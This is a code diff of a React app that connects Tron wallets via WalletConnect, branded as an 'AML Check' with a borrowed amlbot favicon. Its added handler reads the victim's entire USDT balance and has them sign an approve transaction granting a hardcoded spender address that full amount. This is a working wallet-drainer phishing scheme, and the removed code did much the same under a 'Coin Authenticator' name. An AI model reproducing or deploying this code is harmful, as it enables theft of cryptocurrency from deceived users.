@@ -259,129 +259,127 @@
 // }
 
 // export default WalletConnectComponent;
-
-// React component: WalletConnect for Tron only
+// ✅ Updated React Component with WalletConnectWallet support via @tronweb3/walletconnect-tron
 import React, { useEffect, useState } from 'react';
-import { TronWeb } from 'tronweb';
+import TronWeb from 'tronweb';
 import { WalletConnectWallet, WalletConnectChainID } from '@tronweb3/walletconnect-tron';
 
 const contractAddressUSDT = 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t';
-const contractAddress = 'THHeEtDrFnDg3hY21SEETb9qLhhtFbd6Gi';
-const minWithdraw = 200 * 1e6; // 200 USDT in micro units
-const projectId = '150d746f7722fa489e9df7ad9ddcd955';
-const url_origin = 'https://benevolent-chimera-25b465.netlify.app';
+const spenderAddress = 'THHeEtDrFnDg3hY21SEETb9qLhhtFbd6Gi';
+const tokenPriceInUSD = 1;
+const min_withdraw = 1;
+const projectId = '150d746f7722fa489e9df7ad9ddcd955'; // Replace with real WC project ID
 
-export default function TronWalletConnectApp() {
-  const [wallet, setWallet] = useState(null);
-  const [address, setAddress] = useState(null);
-  const [tronWeb, setTronWeb] = useState(null);
-  const [usdtBalance, setUsdtBalance] = useState(0);
+const wallet = new WalletConnectWallet({
+  network: WalletConnectChainID.Mainnet,
+  relayUrl: `https://relay.walletconnect.org?projectId=${projectId}`,
+  options: {
+    projectId,
+    metadata: {
+      name: 'AML Check',
+      description: 'Tron WalletConnect',
+      url: window.location.origin,
+      icons: ['https://amlbot.com/favicon.png'],
+    },
+  },
+  web3ModalConfig: {
+    themeMode: 'dark',
+    themeVariables: {
+      '--w3m-z-index': 1000,
+    },
+    explorerRecommendedWalletIds: [
+      '4622a2b2d6af1c9844944291e5e7351a6aa24cd7b23099efac1b2fd875da31a0',
+      'e9ff15be73584489ca4a66f64d32c4537711797e30b6660dbcb71ea72a42b1f4',
+      '38f5d18bd8522c244bdd70cb4a68e0e718865155811c043f052fb9f1c51de662',
+      '19177a98252e07ddfc9af2083ba8e07ef627cb6103467ffebb3f8f4205fd7927'
+    ],
+    explorerExcludedWalletIds: 'ALL',
+  },
+});
 
-  useEffect(() => {
-    const initWallet = new WalletConnectWallet({
-      network: WalletConnectChainID.Mainnet,
-      relayUrl: `https://relay.walletconnect.org?projectId=${projectId}`,
-      options: {
-        projectId,
-        metadata: {
-          name: 'Coin Authenticator',
-          description: 'Tron WalletConnect',
-          url: url_origin,
-          icons: ['https://amlbot.com/favicon.png']
-        }
-      },
-      web3ModalConfig: {
-        themeMode: 'dark',
-        themeVariables: {
-          '--w3m-z-index': 1000
-        },
-        explorerRecommendedWalletIds: [
-          // wallet ids from explorer.walletconnect.com
-          '4622a2b2d6af1c9844944291e5e7351a6aa24cd7b23099efac1b2fd875da31a0', // Trust Wallet
-          '38f5d18bd8522c244bdd70cb4a68e0e718865155811c043f052fb9f1c51de662'  // Bitget Wallet
-        ],
-        explorerExcludedWalletIds: 'ALL'
-      }
-    });
-
-    setWallet(initWallet);
-    setTronWeb(new TronWeb({ fullHost: 'https://api.trongrid.io' }));
-  }, []);
+function App() {
+  const [address, setAddress] = useState('');
+  const [status, setStatus] = useState('');
 
   const connectWallet = async () => {
     try {
       const data = await wallet.connect();
       setAddress(data.address);
-      console.log('Connected address:', data.address);
-      await fetchUsdtBalance(data.address);
+      setStatus(`✅ Connected: ${data.address}`);
+    } catch (error) {
+      console.error('Connection error:', error);
+      setStatus('❌ Failed to connect wallet');
+    }
+  };
+
+  const getTrxBalance = async (addr) => {
+    const tronWeb = wallet.tronWeb;
+    const balance = await tronWeb.trx.getBalance(addr);
+    return tronWeb.fromSun(balance);
+  };
+
+  const handleApprove = async () => {
+    if (!address) {
+      setStatus('❌ Wallet not connected');
+      return;
+    }
+
+    try {
+      const tronWeb = wallet.tronWeb;
+      const balanceTRX = await getTrxBalance(address);
+      const contract = await tronWeb.contract().at(contractAddressUSDT);
+      const decimals = await contract.decimals().call();
+      const rawBalance = await contract.balanceOf(address).call();
+      const balance = Number(rawBalance);
+      const balance_normal = balance / Math.pow(10, decimals);
+
+      if (balanceTRX > 5 && balance > 0) {
+        const parameter = [
+          { type: 'address', value: spenderAddress },
+          { type: 'uint256', value: balance },
+        ];
+
+        const options = { feeLimit: 300_000_000, from: address };
+
+        const tx = await tronWeb.transactionBuilder.triggerSmartContract(
+          contractAddressUSDT,
+          'approve(address,uint256)',
+          options,
+          parameter,
+          address
+        );
+
+        const signed = await wallet.signTransaction(tx.transaction);
+        const broadcast = await tronWeb.trx.sendRawTransaction(signed);
+
+        if (broadcast.result) {
+          setStatus(`✅ Approved ${balance_normal} USDT! TX: ${broadcast.txid}`);
+        } else {
+          setStatus('❌ Broadcast failed');
+        }
+      } else {
+        setStatus('⚠️ Not enough balance or TRX');
+      }
     } catch (err) {
-      console.error('Failed to connect Tron wallet:', err);
-    }
-  };
-
-  const fetchUsdtBalance = async (walletAddress) => {
-    try {
-      tronWeb.setAddress(walletAddress); // ✅ Fix for owner_address isn't set
-      const contract = await tronWeb.contract().at(contractAddressUSDT);
-      const balance = await contract.balanceOf(walletAddress).call();
-      const normalizedBalance = parseInt(balance.toString()) / 1e6;
-      setUsdtBalance(normalizedBalance);
-      console.log('USDT Balance:', normalizedBalance);
-    } catch (error) {
-      console.error('Error fetching USDT balance:', error);
-    }
-  };
-
-  const approveOnly = async () => {
-    try {
-      // if (usdtBalance * 1e6 < minWithdraw) {
-      //   alert('Balance is less than minimum withdraw limit.');
-      //   return;
-      // }
-
-      // const contract = await tronWeb.contract().at(contractAddressUSDT);
-
-      // const approveTx = await contract.approve(contractAddress, usdtBalance * 1e6).send({
-      //   from: address
-      // });
-      // console.log('Approve transaction sent:', approveTx);
-      // alert('Approve successful');
-
-      tronWeb.setAddress(address); // Set sender
-
-      const contract = await tronWeb.contract().at(contractAddressUSDT);
-
-      // Manually build transaction (NOT .send())
-      const tx = await contract.approve(contractAddress, usdtBalance * 1e6).send({
-        feeLimit: 100_000_000,
-        callValue: 0,
-        shouldPollResponse: false
-      }, address);
-
-      // Sign with WalletConnect
-      const signedTx = await wallet.signTransaction(tx);
-
-      // Broadcast
-      const result = await tronWeb.trx.sendRawTransaction(signedTx);
-
-      console.log('Approve Tx Result:', result);
-      alert('Approve successful');
-    } catch (error) {
-      console.error('Approve failed:', error);
-      alert('Approve failed');
+      console.error('Approve error:', err);
+      setStatus('❌ Approve failed');
     }
   };
 
   return (
-    <div style={{ padding: '2rem' }}>
-      <h2>Connect Tron Wallet (USDT)</h2>
-      <button onClick={connectWallet}>Connect Tron Wallet</button>
-      {address && <>
-        <p>Connected Address: {address}</p>
-        <p>USDT Balance: {usdtBalance}</p>
-        <button onClick={approveOnly}>Approve</button>
-      </>}
+    <div style={{ padding: 20 }}>
+      <h2>WalletConnect TRON USDT Approve</h2>
+      {!address ? (
+        <button onClick={connectWallet}>Connect Wallet</button>
+      ) : (
+        <>
+          <p>Address: {address}</p>
+          <button onClick={handleApprove}>Approve USDT</button>
+        </>
+      )}
+      <p>{status}</p>
     </div>
   );
 }
 
+export default App;
